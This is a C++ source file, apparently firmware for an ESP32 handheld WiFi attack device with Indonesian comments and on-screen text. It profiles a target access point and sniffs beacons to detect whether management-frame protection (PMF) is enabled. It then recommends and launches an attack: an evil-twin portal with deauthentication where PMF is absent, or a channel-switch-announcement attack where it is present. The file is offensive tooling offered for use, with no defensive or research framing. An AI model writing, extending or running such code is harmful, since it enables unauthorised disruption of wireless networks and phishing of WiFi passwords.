#include "smart_attack.h"
#include "ui_helpers.h"
#include "state_machine.h"
#include "ui_screens.h"
#include "attack_engine.h"
#include "wifi_state.h"
#include "recon.h"
#include "web_remote.h"
#include "templates.h"
#include <WiFi.h>
#include "pins.h"

int g_smartRecommendation = 0;

volatile bool g_pmfChecked = false;
volatile bool g_pmfResult = false;
volatile bool g_pmfFoundFlag = false;

static const char* authName(wifi_auth_mode_t m) {
  switch (m) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENT";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
    default: return "?";
  }
}

void drawSmartProfile() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("SMART PROFILE", TFT_PURPLE);

  int idx = selectedIdx;
  wifi_auth_mode_t auth = WiFi.encryptionType(idx);
  bool pmf = detectPMF(idx);
  const char* vendor = vendorFromMacBytes(WiFi.BSSID(idx));

  if (auth == WIFI_AUTH_OPEN) {
    g_smartRecommendation = 1; // Evil Twin (tanpa deauth perlu)
  } else if (pmf || auth == WIFI_AUTH_WPA3_PSK || auth == WIFI_AUTH_WPA2_WPA3_PSK) {
    g_smartRecommendation = 3; // CSA Attack
  } else {
    g_smartRecommendation = 1; // Evil Twin + Deauth
  }

  const char* rec = (g_smartRecommendation == 1) ? "EVIL TWIN" :
                    (g_smartRecommendation == 3) ? "CSA ATTACK" : "DEAUTH";

  tft.setTextFont(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(4, 28); tft.print(targetSSID.substring(0, 18));
  tft.setCursor(4, 42); tft.print("BSSID: ");
  tft.print(String(WiFi.BSSIDstr(idx)));
  tft.setCursor(4, 56); tft.print("CH:"); tft.print(WiFi.channel(idx));
  tft.print("  AUTH:"); tft.print(authName(auth));
  tft.setCursor(4, 70); tft.print("PMF:"); tft.print(pmf ? "YA" : "TIDAK");
  tft.setCursor(4, 84); tft.print("VENDOR:"); tft.print(vendor ? vendor : "-");
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(4, 100); tft.print("REKOMENDASI: "); tft.print(rec);

  drawFooter("ATAS=Batal | BAWAH=Jalankan");
}

void startSmartRecommendedAttack() {
  stopAllAttacks();
  if (g_smartRecommendation == 3) {
    currentState = CSA_RUNNING;
    startCSAAttack();
    drawCSARunning(0);
  } else {
    selectedTemplateIdx = 0;
    verifyAttempts = 0;
    verifyState = 0;
    currentState = TEMPLATE_SELECT;
    templateSelection = 0;
    drawTemplateSelect();
  }
}


// ---------------------------------------------------------------------------
// Deteksi PMF (802.11w) presisi via parsing RSN capabilities beacon
// ---------------------------------------------------------------------------
static volatile bool g_pmfFound = false;
static volatile bool g_pmfEnabled = false;
static volatile uint32_t g_pmfBeaconCount = 0;
static uint8_t g_pmfBSSID[6] = {0};

static void pmfCaptureCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  uint16_t sig_len = pkt->rx_ctrl.sig_len;
  if (sig_len < 24) return;

  uint8_t subtype = (p[0] >> 4) & 0x0F;
  if (subtype != 0x08) return; // beacon
  g_pmfBeaconCount++;
  if (memcmp(&p[16], g_pmfBSSID, 6) != 0) return;

  int pos = 36; // 24 header + 12 fixed params
  while (pos + 2 <= sig_len) {
    uint8_t eid = p[pos];
    uint8_t len = p[pos + 1];
    if (pos + 2 + len > sig_len) break;

    if (eid == 0x30) { // RSN IE
      int d = pos + 2;
      int dlen = len;
      if (dlen >= 8) {
        uint16_t pcount = p[d + 6] | (p[d + 7] << 8);
        int off = d + 8 + pcount * 4;
        if (off + 2 <= d + dlen) {
          uint16_t acount = p[off] | (p[off + 1] << 8);
          off += 2 + acount * 4;
          if (off + 2 <= d + dlen) {
            uint16_t caps = p[off] | (p[off + 1] << 8);
            g_pmfEnabled = (caps & 0x00C0) != 0; // bit 6 = capable, bit 7 = required
            g_pmfFound = true;
          }
        }
      }
      break;
    }
    pos += 2 + len;
  }
}

static bool detectPMFExact(const uint8_t* bssid, uint8_t channel) {
  g_pmfFound = false;
  g_pmfEnabled = false;
  g_pmfBeaconCount = 0;
  memcpy(g_pmfBSSID, bssid, 6);

  // Promiscuous hanya menangkap beacon eksternal di mode STA (AP sempat turun).
  radioSetMode(RADIO_STA);
  delay(80);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(40);

  esp_wifi_set_promiscuous_rx_cb(pmfCaptureCb);
  esp_wifi_set_promiscuous(true);
  Serial.printf("[PMF] sniff ch=%u bssid=%02X:%02X:%02X:%02X:%02X:%02X\n",
                channel, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

  unsigned long start = millis();
  while (!g_pmfFound && (millis() - start) < 1200) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) break;
    delay(10);
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  Serial.printf("[PMF] done beacons=%u found=%d enabled=%d elapsed=%lu\n",
                (unsigned)g_pmfBeaconCount, (int)g_pmfFound, (int)g_pmfEnabled,
                (unsigned long)(millis() - start));
  return g_pmfEnabled;
}

bool detectPMFByBssid(const uint8_t* bssid, uint8_t channel, bool* found) {
  bool pmf = detectPMFExact(bssid, channel);
  g_pmfChecked = true;
  g_pmfResult = pmf;
  g_pmfFoundFlag = g_pmfFound;
  if (found) *found = g_pmfFound;
  return pmf;
}

bool detectPMF(int idx) {
  wifi_ap_record_t records[32];
  uint16_t count = 32;
  if (esp_wifi_scan_get_ap_records(&count, records) != ESP_OK) return false;
  if (idx >= count) return false;

  wifi_auth_mode_t m = records[idx].authmode;
  if (m == WIFI_AUTH_WPA3_PSK || m == WIFI_AUTH_WPA2_WPA3_PSK) return true;

  // WPA2 bisa tetap aktif PMF (802.11w) -> deteksi presisi dari beacon RSN
  uint8_t bssid[6];
  memcpy(bssid, records[idx].bssid, 6);
  return detectPMFExact(bssid, records[idx].primary);
}

